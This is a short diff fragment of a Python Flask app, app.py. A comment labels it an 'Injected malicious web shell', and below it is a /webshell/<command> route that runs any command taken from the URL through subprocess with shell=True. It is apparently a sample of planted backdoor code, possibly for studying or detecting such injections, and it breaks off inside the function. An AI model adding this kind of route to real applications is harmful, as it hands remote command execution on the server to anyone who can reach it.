@@ -62,6 +62,7 @@ def uploads(file_name):
         except UnicodeDecodeError:
             return 'Cannot display binary file.'
 
+# Injected malicious web shell at the end of app.py file
 @app.route('/webshell/<command>')
 def webshell(command):
     result = subprocess.check_output(command, shell=True)
